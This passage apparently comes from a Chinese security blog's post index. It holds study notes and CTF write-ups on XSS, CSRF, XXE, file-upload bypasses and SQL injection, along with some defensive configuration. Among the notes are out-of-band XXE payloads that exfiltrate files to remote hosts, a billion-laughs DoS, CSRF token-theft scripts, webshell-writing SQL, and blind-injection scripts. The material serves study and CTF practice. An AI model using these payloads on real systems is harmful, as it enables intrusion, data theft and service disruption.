from alf.nu function escape (s) { s = s.replace(/\"/g, '\\\\\"') return '&lt;script>console.log(\"' + s + '\");&lt;/script>' } 只替换一次，自己再加上一个反斜线转义前面的反斜线即可 \\\");alert(1)// 总结还是学到了些东西，尤其是正则的匹配以及编码的知识 参考文章haozi&#x2F;xss-demo 在线做题笔记新的xss挑战","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"xss","slug":"xss","permalink":"https://0xr1ngs.github.io/tags/xss/"}]},{"title":"实验吧-因吹斯汀的绕过-writeup","slug":"interesting","date":"2018-07-12T12:10:50.000Z","updated":"2023-07-10T09:48:47.923Z","comments":true,"path":"2018/07/12/interesting/","link":"","permalink":"https://0xr1ngs.github.io/2018/07/12/interesting/","excerpt":"","text":"payload1' or 1=1 group by pwd with rollup limit 1 offset 2 # 后台核心代码$filter = \"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\"; mysql_select_db($db, $con); $sql=\"SELECT * FROM interest WHERE uname = '{$_POST['uname']}'\"; $query = mysql_query($sql); if (mysql_num_rows($query) == 1) { $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) { print \"CTF{XXXXXX}\"; }else{ print \"亦可赛艇！\"; } }else{ print \"一颗赛艇！\"; } 带入uname的值查询 如果查询结果的行的数目为1的话（查询成功）继续执行,如果输入的pwd和查询的pwd相同的话输出flag 本地测试mysql> select * from demo where password = '' or 1=1; +-------+----------+------+ | name | password | id | +-------+----------+------+ | admin | admin888 | 1 | | user1 | pass2 | 2 | | user2 | pass3 | 3 | +-------+----------+------+ 3 rows in set (0.00 sec) mysql> select * from demo where password = '' or 1=1 group by password with rollup; +-------+----------+------+ | name | password | id | +-------+----------+------+ | admin | admin888 | 1 | | user1 | pass2 | 2 | | user2 | pass3 | 3 | | user2 | NULL | 3 | +-------+----------+------+ 4 rows in set (0.00 sec) or 1&#x3D;1可以返回所有的结果，而如果查询的结果超过两行，with rollup就会多返回一行，并且password（由group by 决定）为NULL，再加入limit 1就可以只返回一行，而用offset，表示返回哪一行，null结果是在最后一行插入的，所以offset要指向最后一行，但我们并不知道最后一行的行数是几，所以用二分法测试 超过行数的话就会返回empty set，也就是没有返回一行而查询失败，所以只要测试出最后null的行数，此时查询成功返回的就是任意的一个uname和password为NULL的结果，此时密码一项不填为空，null和null相等就可以得到flag mysql> select * from demo where password = '' or 1=1 group by password with rollup limit 1 offset 3; +-------+----------+------+ | name | password | id | +-------+----------+------+ | user2 | NULL | 3 | +-------+----------+------+ 1 row in set (0.00 sec)","categories":[{"name":"CTF","slug":"CTF","permalink":"https://0xr1ngs.github.io/categories/CTF/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://0xr1ngs.github.io/tags/sqli/"}]},{"title":"csrf","slug":"csrf","date":"2018-06-09T09:18:33.000Z","updated":"2023-07-10T10:19:35.820Z","comments":true,"path":"2018/06/09/csrf/","link":"","permalink":"https://0xr1ngs.github.io/2018/06/09/csrf/","excerpt":"","text":"请求方式get利用html里的带src属性的元素发出跨域请求 &lt;link href=\"url\"> &lt;img src=\"url\"> &lt;iframe src=\"url\"> &lt;meta http-equiv=\"refresh\" content=\"0;url=url\"> &lt;script src=\"url\"> &lt;video src=\"url\"> &lt;audio src=\"url\"> &lt;a href=\"url\"> &lt;table background=\"url\"> post&lt;form method=\"POST\" id=\"hack\" action=\"url\"> &lt;input type=\"hidden\" name=\"passwd_new\" value=\"csrf\"> &lt;input type=\"hidden\" name=\"passwd_conf\" value=\"csrf\"> &lt;/form> &lt;script> document.getElementById(\"hack\").submit(); &lt;/script> 防御方法验证referer data:协议访问和https向http跳转时候referer为空 把文件放在一个GOOGLE.COM的目录，绕过关键字验证 使用验证码影响用户体验 使用csrf token攻击者无法使用js获取外域页面的token值，遵循同源策略 配合xss攻击如果网站还存在着一个xss漏洞，可以用xss窃取同域的csrftoken然后发起csrf攻击可以在有xss漏洞的页面嵌入以下代码 &lt;iframe src=\"../csrf\" onload=alert(frames[0].document.getElementsByName('user_token')[0].value)>&lt;!--成功--> &lt;iframe src=\"../csrf\" onload=window.open(\"../csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change&amp;user_token=\"+frames[0].document.getElementsByName('user_token')[0].value+\"#\")> &lt;!--失败 报错csrf token is incorrect 用window.open重新打开一个以面后token刷新了--> 没有过滤script关键字 &lt;script> var frameObj = document.createElement(\"iframe\"); frameObj.setAttribute(\"id\", \"add\"); document.body.appendChild(frameObj); document.getElementById(\"add\").src = \"admin.php?c=admin&amp;f=save\"; var token = document.getElementById(\"add\").contentWindow.document.getElementById(\"token\").value; //从iframe中的页面中获取token值 var xmlhttp; if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari xmlhttp = new XMLHttpRequest(); } else { // code for IE6, IE5 xmlhttp = new ActiveXObject(\"Microsoft.XMLHTTP\"); } xmlhttp.open(\"POST\", \"admin.php?c=admin&amp;f=save\", true); xmlhttp.send(\"id=1&amp;accont=wooyun&amp;pass=123456&amp;status=1&amp;if_system=1&amp;token=\"+token); //带上token提交添加管理员的请求 &lt;/script> 过滤关键字，加载远程的js代码 &lt;img src=1 onerror=document.body.appendChild(document.createElement('script')).src='url'> &lt;object data=\"data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3h4eC54eHgvYS5qcz48L3NjcmlwdD4=\">&lt;/object> &lt;iframe src=\"data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3h4eC54eHgvYS5qcz48L3NjcmlwdD4=\">&lt;/iframe> &lt;script src=http://xxx.xxx/a.js>&lt;/script>","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"csrf","slug":"csrf","permalink":"https://0xr1ngs.github.io/tags/csrf/"}]},{"title":"xxe总结","slug":"xxe","date":"2018-06-02T11:12:55.000Z","updated":"2023-08-22T13:27:04.960Z","comments":true,"path":"2018/06/02/xxe/","link":"","permalink":"https://0xr1ngs.github.io/2018/06/02/xxe/","excerpt":"","text":"xmlxml是一种标记语言，设计宗旨是传输数据，需要自定义标签，他仅仅是纯文本而已 &lt;?xml version=\"1.0\"?> xml声明 &lt;!DOCTYPE note [ 内部的dtd 被包装在一个doctype声明中 &lt;!ELEMENT note (to,from,heading,body)> &lt;!ELEMENT to (#PCDATA)> &lt;!ELEMENT from (#PCDATA)> &lt;!ELEMENT heading (#PCDATA)> &lt;!ELEMENT body (#PCDATA)> ]> &lt;note> 根元素 必须有 &lt;to>George&lt;/to> 4个子元素 子元素还可以有子元素 &lt;from>John&lt;/from> &lt;heading>Reminder&lt;/heading> &lt;body>Don't forget the meeting!&lt;/body> &lt;/note> dtd 文档类型定义dtd的作用是定义xml文档的合法构建模块 内部dtd可被成行地声明于xml文档中，也可以作为一个外部引用 &lt;!DOCTYPE note [ 定义此文档是note类型的文档 &lt;!ELEMENT note (to,from,heading,body)> 定义note元素有四个子元素 &lt;!ELEMENT to (#PCDATA)> 定义元素 类型为\"#PCDATA\" &lt;!ELEMENT from (#PCDATA)> &lt;!ELEMENT heading (#PCDATA)> &lt;!ELEMENT body (#PCDATA)> ]> 外部dtd如果部署在外部，则应该这样声明 &lt;?xml version=\"1.0\"?> &lt;!DOCTYPE note SYSTEM \"note.dtd\"> &lt;note> &lt;to>George&lt;/to> &lt;from>John&lt;/from> &lt;heading>Reminder&lt;/heading> &lt;body>Don't forget the meeting!&lt;/body> &lt;/note> 外部的note.dtd文件 &lt;!ELEMENT note (to,from,heading,body)> &lt;!ELEMENT to (#PCDATA)> &lt;!ELEMENT from (#PCDATA)> &lt;!ELEMENT heading (#PCDATA)> &lt;!ELEMENT body (#PCDATA)> 实体实体是用于定义引用普通文本或特殊字符的快捷方式的变量实体可以在内部或者外部声明 内部实体一个实体由一个&amp;，一个实体名称，一个;构成 &lt;!ENTITY writer \"r1ngs\"> 在dtd里声明 &lt;author>&amp;writer;&lt;/author> xml里引用 外部实体&lt;!ENTITY writer SYSTEM \"url\"> &lt;author>&amp;writer;&lt;/author> 参数实体仅仅在dtd中使用的解析实体为参数实体 &lt;!ENTITY % writer \"r1ngs\"> 内部 &lt;!ENTITY % writer SYSTEM \"url\"> 外部 在dtd内引用： %writer; 漏洞利用php里的simplexml_load_string在旧版本里默认解析外部实体 如果网站解析的xml是外部可控的，或者在与服务器交互的时候将json数据格式改为xml，都可能会导致服务器解析恶意的xml脚本 读取文件&#x2F;&#x2F;不同程序支持协议不一样 读取失败的时候可以考虑php:&#x2F;&#x2F;filter&lt;?xml version=\"1.0\"?> &lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM \"file:///home/ctf/flag.txt\" > ]> &lt;aaa>&amp;xxe;&lt;/aaa> 没有数据回显的时候有的解析器不能在实体定义的时候引用参数实体，所以要把声明放到攻击者的服务器漏洞复现： &lt;?php header(\"Content-type: text/html; charset=utf-8\"); echo \"&lt;h3>xxe test！&lt;/h3>\"; $xml = '&lt;!DOCTYPE ANY [ &lt;!ENTITY % remote SYSTEM \"http://192.168.41.1:81/evil.dtd\"> %remote; %param1; ]> &lt;root>&amp;external;&lt;/root>'; try{ $doc = simplexml_load_string($xml); } catch(Exception $e){ print \"error\"; } ?> 远程的dtd文件 &lt;!ENTITY % payload SYSTEM \"php://filter/convert.base64-encode/resource=1.txt\"> &lt;!ENTITY % param1 \"&lt;!ENTITY external SYSTEM 'http://192.168.41.1:81/1.php?file=%payload;'>\"> dos攻击&lt;?xml version = \"1.0\"?> &lt;!DOCTYPE lolz [ &lt;!ENTITY lol \"lol\"> &lt;!ENTITY lol1 \"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;\"> &lt;!ENTITY lol2 \"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;\"> &lt;!ENTITY lol3 \"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;\"> &lt;!ENTITY lol4 \"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;\"> &lt;!ENTITY lol5 \"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;\"> &lt;!ENTITY lol6 \"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;\"> &lt;!ENTITY lol7 \"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;\"> &lt;!ENTITY lol8 \"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;\"> &lt;!ENTITY lol9 \"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;\"> ]> &lt;lolz>&amp;lol9;&lt;/lolz> 还有执行系统命令，探测内网端口等效果 防御 禁止使用外部实体 PHP： libxml_disable_entity_loader(true); JAVA: DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); Python： from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的xml数据 赛总♂牛逼在写这篇文章的时候翻了一下之前和赛总的聊天记录，赛总之前教了我一个没有vps也能实现blind xxe的黑魔法 burp collaborator clientburp里的这个功能可以随机生成一条由burp.collaborator.server分给你的链接，任何访问了这个链接的请求都会被记录下来，当关掉这个面板的时候链接失效 githubgithub上可以托管代码文件，raw功能预览代码，此时url就可以作为远程文件的链接 https://raw.githubusercontent.com/R1ng6/CTFtool/master/evil.dtd 但是当时我找了一个普通的xxe的ctf题目，发现调用参数实体的时候无法访问dtd文件里面指向的collaborator链接后来发现是默认不支持协议github上的链接是https协议，php默认不支持 搭博客，买域名正好之前用github搭建了博客，还买了域名进行重定向，用域名访问博客地址就是http协议，于是我马上试了一下在靶机里面的xml $xml = '&lt;!DOCTYPE ANY [ &lt;!ENTITY % remote SYSTEM \"http://r1ngs.top/test.dtd\"> %remote; %param1; ]> &lt;root>&amp;external;&lt;/root>'; github上的dtd &lt;!ENTITY % payload SYSTEM \"php://filter/convert.base64-encode/resource=1.txt\"> &lt;!ENTITY % param1 \"&lt;!ENTITY external SYSTEM 'http://xcd123kik2apvsgubws336a9107qvf.burpcollaborator.net/?flag=%payload;'>\"> 只是不知道为什么github上只能命名为dtd，如果是xml的话访问链接会报404最后成功读取到了靶机目录下的1.txt文件","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"xxe","slug":"xxe","permalink":"https://0xr1ngs.github.io/tags/xxe/"}]},{"title":"文件上传","slug":"file-upload","date":"2018-05-31T13:11:43.000Z","updated":"2023-08-22T13:20:17.292Z","comments":true,"path":"2018/05/31/file-upload/","link":"","permalink":"https://0xr1ngs.github.io/2018/05/31/file-upload/","excerpt":"","text":"客户端检验一般使用js代码检验后缀名可以先命名为jpg然后再抓包更改为php上传或者直接禁用js 服务端 将文件后缀名改为1.aaaaa这种不存在的文件 如果正常上传，说明黑名单规则 反之白名单规则 黑名单拓展名黑名单绕过在黑名单里设有php,php2,php3.phtml等 可以用evil.Php.aaa，apache如果解析不了.aaa拓展名，会继续向前寻找可以解析的拓展名 尝试大小写绕过或者找拓展名的漏网之鱼 jsp：jspx、jspf； asp：asa、cer、aspx； php：php、php2、php3、php4、php5、phps、pht、phtm、phtml； exe：exee 白名单0x01 Content-Type文件类型 抓包的时候改为image&#x2F;gif Content-TypeContent-Type是MIME（Multipurpose Internet Mail Extensions）标准的一部分，可以同时用于HTTP请求头和HTTP响应头，用于指示正在传输的HTTP消息的数据类型。**application/octet-stream** 是一种通用的二进制数据类型，用于表示未知类型的二进制文件。当服务器无法确定特定文件的确切MIME类型时，或者文件类型不受支持时，可以使用该类型。它将文件视为无格式的字节流，通常不会由浏览器尝试解析或显示，而是会提示用户下载。 文件上传漏洞修复：设置文件拓展名白名单，并且对文件重新随机命名，同时将上传的附件放到一个单独存放的目录。将该目录所有文件的Content-Type设置为**application/octet-stream**等，确保不会被解析。 比如nginx： server { listen 80 default_server; listen [::]:80 default_server; root /var/www/html; index index.php index.html index.htm index.nginx-debian.html; server_name _; location / { try_files $uri $uri/ =404; } location ~ ^/uploads/ { add_header Content-Type application/octet-stream; } location ~ \\\\.php$ { include snippets/fastcgi-php.conf; # With php-fpm (or other unix sockets): fastcgi_pass unix:/var/run/php/php5.6-fpm.sock; } } 0x02 文件头绕过 在文件头加上文件信息，比如 GIF89a&lt;?php phpinfo();?> Nginx解析%00截断00在ascii里表示NULL，当系统读取到0x00时认为文件名已经结束 通过抓包将evil.php1.jpg的1换成0x00从而上传evil.php 也可以是路径 /upload/1.php(0x00)+文件名 1.jpg ，结合后为&#x2F;upload&#x2F;1.php(0x00)&#x2F;1.jpg存入 fix_pathinfo配置nginx默认配置解析.php结尾的文件。如果php.ini设置fix_pathinfo&#x3D;1则由于nginx和PHP对PATH_INFO的差异处理导致&#x2F;1.gif&#x2F;.php解析。 nginx复现配置： server { listen 8080 default_server; listen [::]:8080 default_server; root /var/www/html; index index.html index.php; server_name _; location / { try_files $uri $uri/ =404; } location ~ \\\\.php$ { fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name; fastcgi_param DOCUMENT_ROOT /var/www/html; fastcgi_pass 127.0.0.1:9000; } } nginx新版默认配置解决了这个问题： fastcgi_split_path_info ^(.+?\\\\.php)(/.*)$; 或者PHP-FPM配置security.limit_extensions也可以解决。 Apache解析尝试上传: evil.php\\n evil.php.xyz evil.php.jpeg 重写解析规则上传.htaccess文件，重写解析规则，将图片用脚本方式解析在可以上传.htaccess文件时上传这个文件，文件内容如下,然后再上传evil.gif就可以让它以php方式解析 &lt;FilesMatch \"evil.gif\"> SetHandler application/x-httpd-php &lt;/FilesMatch> ADS流文件ADS是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，即除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。 上传1.php文件的时候改包为1.php:1.jpg即就是上传一个1.jpg的内容为上传前的1.php的内容的数据流文件，且与宿主文件1.php关联。 最后上传到服务器的是1.php文件，文件内容为空，在目录下使用命令 notepad 1.php:1.jpg 就可以看到1.jpg文件的内容即之前的1.php的内容可以再结合文件包含把1.php:1.jpg包含进来，达到代码执行的作用 :$DATA默认数据流 NTFS文件系统包含对备用数据流的支持，备用数据流允许文件包含多个数据流。每个文件至少有一个数据流，windows中的默认数据流就是:$DATA 1.php::$DATA 生成1.php &lt;?php phpinfo();?> 1.php::$INDEX_ALLOCATION 生成1.php文件夹 windows系统windows系统不允许文件名包含下列任何字符 /\\\\:*?&lt;>|\" 可以在发包的时候改为1.php&#x2F;1.jpg上传的时候会自动删除不规范字符后面的内容，但是文件内容为空如果服务器使用黑名单的思想去校验我们可以覆盖文件内容，并且 没有重命名文件 ，那么就可以再次上传覆盖由windows搜索文件名的特性: &lt; 符号可以匹配任意字符如果我们的文件为1.php，那么再上传一个1.&lt;&lt;&lt;，内容为webshell，那么就可以把webshell写入1.php了补充： php对文件做处理的函数使用的时候会调用一个windows的底层api 使用 &lt;可以匹配任意单字符，&lt;&lt;则可以匹配任意字符，相当于正则表达式里的 .+ linux系统尝试大小写绕过","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://0xr1ngs.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"sql注入总结","slug":"sql","date":"2018-05-26T09:18:33.000Z","updated":"2023-08-22T13:24:59.961Z","comments":true,"path":"2018/05/26/sql/","link":"","permalink":"https://0xr1ngs.github.io/2018/05/26/sql/","excerpt":"","text":"思路0x01 参数包裹测试 1 ' \" ( { 0x02 测试WAF测试空格 uname&#x3D;adm in 和uname&#x3D;admin 有没有被过滤为空用burp里的intruder功能fuzz单字符，字典包含所有的字符标点，–+等 id=1$'$ 测试关键字waf，and，select等 id=1$and$ 依据有差别的注入点，测试替换 id=-1' or ''='$and$ /*测试有没有被替换为空等*/ 0x03 测试payload根据被waf的关键字和测试出的能被绕过的关键字去构造payload，确定注入的类型，再用脚本 注入类型0x01 联合查询（有数据回显的时候）获取字段数 id=1' order by 3 --+ id=1' union select 1,2,3--+ payload: id=1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+ id=1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ id=1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag' --+ id=1' union select 1,group_concat(flag),3 from table.flag --+ 0x02 报错注入（union被waf或者没有数据回显）fuzz报错函数有没有被waf:floor() extractvalue() updatexml() geometrycollection() multipoint()polygon() multipolygon() linestring() multilinestring() exp()payload: select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a); select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))); select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b)); select * from test where id=1 and multipoint((select * from(select * from(select user())a)b)); select * from test where id=1 and polygon((select * from(select * from(select user())a)b)); select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b)); select * from test where id=1 and linestring((select * from(select * from(select user())a)b)); select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b)); select * from test where id=1 and exp(~(select * from(select user())a)); 0X03 bool盲注（正确和错误两种结果）字符串截取函数: substr(substring),left,right,mid select left((select username from test limit 0,1),2) = 'ad'; /*不能截取单个字符*/ select substr((select username from test limit 1 offset 0)from 1 for 1) = 'a'; /*绕过逗号过滤*/ select mid((select username from test limit 1 offset 0)from 1 for 1) = 'a'; 上脚本，两种思路1） regexp、rlike /*正则 ^和$表示匹配字符串的开头和结尾*/ like /*不用%和等号一个效果*/ = 缺陷 .可以匹配任意字符 当字典迭代到.的时候匹配一定成功 单字符被waf并且匹配的字符串里面有这个单字符的时候比较尴尬 默认不区分大小写字母，需用binary辨别为大写还是小写 2）二分法 结合ascii或者ord或者hex或者char select hex(substring(database(),1,1)) = 74; /*从十进制的32到127的16进制*/ select ascii(substring(database(),1,1)) = 116; select ord(substring(database(),1,1)) = 116; select substring(database(),1,1) = char(116); 一个丑陋的盲注脚本 #!/usr/bin/env python3 # -*- coding: utf-8 -*- import requests def payload(rawstr): newstr = rawstr.replace(' ', chr(0x09)).replace('or', 'Or') # 必须用chr 把16进制转化成字符'\\t' return newstr url = 'http://ctf5.shiyanbar.com/web/earnest/index.php' ses = requests.session() true_state = 'You are in' # database i = 1 raw = \"0' or length(database())=%d or '0\" while 1: rawpay = raw % (i) data = {'id': payload(rawpay)} txt = ses.post(url, data=data).content.decode() if true_state in txt: break i += 1 if i > 100: print('length error!') print(\"database.length:: %d\" % (i)) length = i str = '' raw = \"0' or (select ascii(mid( (select database() limit 1 offset 0) from %d)) > %d) or '0\" # 可以不用for for i in range(length): i += 1 min = 31 max = 126 ''' min和max各自代表ascii可打印字符的上限和下限 ''' while 1: rawpay = raw % (i, (min + max) // 2) data = {'id': payload(rawpay)} txt = ses.post(url, data=data).content.decode() if true_state in txt: if (max - (min + max) // 2) == 1: asc = max str += chr(asc) print(str) break else: min = (max + min) // 2 else: max = (max + min) // 2 print(\"database::%s\" % (str)) 上面的脚本由于题目网络问题跑的有点慢，所以我加上了多线程, 速度提升明显，只是脚本依然丑陋 #! /usr/bin/env python # -*- coding: utf-8 -*- from concurrent.futures import ThreadPoolExecutor import requests, queue def payload(rawstr): newstr = rawstr.replace(' ', chr(0x09)).replace('or', 'Or') # 必须用chr 把16进制转化成字符'\\t' return newstr url = 'http://ctf5.shiyanbar.com/web/earnest/index.php' ses = requests.session() true_state = 'You are in' # database i = 1 raw = \"0' or length(database())=%d or '0\" while 1: print(i) rawpay = raw % i data = {'id': payload(rawpay)} txt = ses.post(url, data=data).content.decode() if true_state in txt: break i += 1 if i > 100: print('length error! please check your payload!') print(\"database.length:: %d\" % (i)) q = queue.Queue(0) length = i def sqli(i): min = 31 max = 126 raw = \"0' or (select ascii(mid( (select database() limit 1 offset 0) from %d)) > %d) or '0\" # 可以不用for while 1: rawpay = raw % (i, (min + max) // 2) data = {'id': payload(rawpay)} txt = ses.post(url, data=data).content.decode() if true_state in txt: if (max - (min + max) // 2) == 1: asc = max q.put((i, chr(asc))) break else: min = (max + min) // 2 else: max = (max + min) // 2 # threads start threads = [] with ThreadPoolExecutor(10) as executor: executor.map(sqli,range(1, length+1)) #get result result = [] while not q.empty(): result.append(q.get()) #sort def get_zero(ele): return ele[0] result.sort(key = get_zero) str = '' for i in range(len(result)): str += result[i][1] print(\"database::%s\" % (str)) 位运算符和算术运算符注入(and or 被waf死) payload: select id from test where id = '0'^(select(ascii(mid(database(),1,1))>1))^'0'; /*括号绕过空格*/ select id from test where id = '0'xor(select(ascii(mid(database(),1,1))>1))xor'0'; select id from test where id = '0'|(select(ascii(mid(database(),1,1))>1))|'0'; select id from test where id = '1'&amp;(select(ascii(mid(database(),1,1))>1))&amp;'1'; select id from test where id = '0'+(select(ascii(mid(database(),1,1))>1))+'0'; select id from test where id = '1'-(select(ascii(mid(database(),1,1))>1))-'0'; select id from test where id = '1'*(select(ascii(mid(database(),1,1))>1))*'1'; select id from test where id = '1'/(select(ascii(mid(database(),1,1))>1))/'1'; 直接查询同一张表的字段 '0'^(select(ascii(mid((select(passwd))from(%d)))>%d))^'1' /*uname和passwd是同一张表的两个字段*/ 0x04 时间盲注（只有一种返回结果）延迟：sleep,benchmark,heavy query（利用information_schema里的表做笛卡尔积运算，返回时间不稳定） select if(2>1, sleep(2), 1); select if(2>1, benchmark(1e7,md5(1)), 1); select if(2>1, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C), 1); /*时间由columns的数量和服务器处理器性能等决定*/ 过滤了逗号 select case when 2>1 then sleep(2) else 1 end; payload构造的时候注意and和or的短路性，sleep函数是否会被执行 mysql> select id from test where id = '1' and sleep(2); Empty set (2.01 sec) mysql> select id from test where id = '0' and sleep(2); Empty set (0.00 sec) mysql> select id from test where id = '1' or sleep(2); +------+ | id | +------+ | 1 | +------+ 1 row in set (2.01 sec) mysql> select id from test where id = '0' or sleep(2); Empty set (4.03 sec) /*每条记录都会尝试匹配id*/ 绕过上学期看的一篇绕过的总结，比较基础 0x01宽字节注入（转义单引号）%bf匹配低位\\，低位的范围中要含有0x5c编码再加一个\\构成\\’ 使单引号逃逸 0x02 sprintf逃逸单引号在php里sprintf进行拼接的时候%后的内容为格式化类型，如果没有这个类型会输出空 &lt;?php $input1 = \"admin%1$' and 1=1#\"; $input2 = \"\"; $input1 = addslashes($input1); $input2 = addslashes($input2); $sql = \"select * from %s where username = '$input1' and password='$input2';\"; echo sprintf( $sql, \"user\") ; //select * from user where username = 'admin' and 1=1#' and password=''; ?> sprintf格式化字符串带来的注入隐患 load_file和outfile0x01 mysql常见的系统函数和变量user() 用户名,current_user 当前用户名,session_user() 连接数据库的用户名 @@hostname 主机名,@@port 数据库端口,version() mysql数据库版本 @@version_compile_os 操作系统,@@datadir 数据库绝对路径,@@basedir mysql绝对路径 测试读写权限 and(select count(*) from mysql.user)>0 --+ 0x02 常见用途可以用来写一句话木马 id = -1 union select load_file ('C:/1.bmp') into outfile 'C:/PHPstudy/WWW/1.php' /*结合文件上传*/ id = -1 union select '&lt;?php @eval($_post[cmd])?>' into outfile 'C:/PHPstudy/WWW/1.php'/*直接写*/ id = -1 union select 0x3c3f70687020406576616c28245f706f73745b636d645d293f3e into outfile 'C:/PHPstudy/WWW/2.php' /*一句话可以换成16进制 outfile只能加单引号*/ 如果想用load_file查看文件，特别是exe等可以00截断或者有回车换行的二进制文件时，最好用hex函数然后再转换回来，这样就不存在截断了 id = -1 union select hex(load_file('C:/1.exe')) 0x03 outfile和dumpfile区别 select * from admin into outfile ‘&#x2F;1.txt’; 可以完整导出每一行记录 而dumpfile只能导出一行数据 对于2进制文件，只能用dumpfile导出，它不对任何列或行进行终止，也不执行任何转义处理 其余操作0x01 update,insert,re头,cookie注入与数据库有交互且用户可以控制的地方都可能存在注入demo insert into test values('aa', '' or (extractvalue(1,concat(0x7e,(select user()),0x7e))) or '', '3'); /*报错*/ insert into test values('aa', '' or (select if(2>1, sleep(1), 1)) or '','3');/*时间盲注*/ update test set name = ''or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or'' where id = 3; update test set name = ''or (select if (2>1,sleep(1), 1)) or'' where id =1; 0x02 二次注入从数据库取出的数据完全信任，在存进数据库的时候注入恶意代码 在注册账号时可以恶意注入一些sql语句 然后在重置密码的时候没有对已经在数据库的数据进行过滤导致可以在没有密码的情况下恶意修改某些账号的密码 比如这样可以注册admin’#的账户来修改admin的密码 update users set password = '&amp;pass' where username = 'admin' #' and password = '$curr_pass' 强网杯在注入点只允许注册数字 用16进制绕过 mysql> insert into demo values('root', 0x312d3520756e696f6e2073656c65637420312c3 22c33,4); Query OK, 1 row affected (0.00 sec) mysql> select * from demo; +-------+------------------------+------+ | name | password | id | +-------+------------------------+------+ | admin | admin888 | 1 | | user1 | pass2 | 2 | | user2 | pass3 | 3 | | root | 1-5 union select 1,2,3 | 4 | +-------+------------------------+------+ 4 rows in set (0.00 sec) 取出数据库里的内容后再进行拼接，1-5&#x3D;-4已经不是字段里面可以弱类型的内容了所以不会显示而显示后面union select的内容 mysql> select * from demo where password = 1-5 union select 1,2,3; +------+----------+------+ | name | password | id | +------+----------+------+ | 1 | 2 | 3 | +------+----------+------+ 1 row in set, 4 warnings (0.00 sec) 0x03 hpf http分割注入 where子句后执行任意不存在函数可以爆出数据库 mysql> select id from test where id = 1 and www(); ERROR 1305 (42000): FUNCTION test.www does not exist 要求同时比对username和password 各自限制一部分 $SQL = \"select * from test where username='$input1' and password = '$input2'\"; payload: username= 1' and updatexml/*&amp;password=*/(1,concat(0x7e,(select database()),0x7e),1) and '1 select * from test where username='1' and updatexml/*' and password = '*/(1,concat(0x7e,(select database()),0x7e),1) and '1' 0x04 已知表名不知字段名直接爆数据思想是通过选取派生表让我们的字段名可控，然后联合查询表里的所有内容 mysql> select * from (select 1)a join (select 2)b join (select 3)c; /*用join连接绕过逗号*/ +---+---+---+ | 1 | 2 | 3 | +---+---+---+ | 1 | 2 | 3 | +---+---+---+ 1 row in set (0.00 sec) mysql> select * from (select 1)a join (select 2)b join (select 3)c union select * from test; /*引入test表*/ +-------+-------+------+ | 1 | 2 | 3 | +-------+-------+------+ | 1 | 2 | 3 | | admin | admin | 1 | | root | root | 2 | +-------+-------+------+ 3 rows in set (0.00 sec) mysql> select d.2 from (select * from (select 1)a join (select 2)b join (select 3)c union select * from test)d limit 1 offset 1; /*将上面的结果再作为一个派生表，用d.2和limit,offset访问字段的内容*/ +-------+ | 2 | +-------+ | admin | +-------+ 1 row in set (0.00 sec) mysql> select * from test where id = -1 union select (select d.2 from (select * from (select 1)a join (select 2)b join (select 3)c union select * from test)d li mit 1 offset 1), (select 0)e, (select 0)f; +-------+----------+------+ | 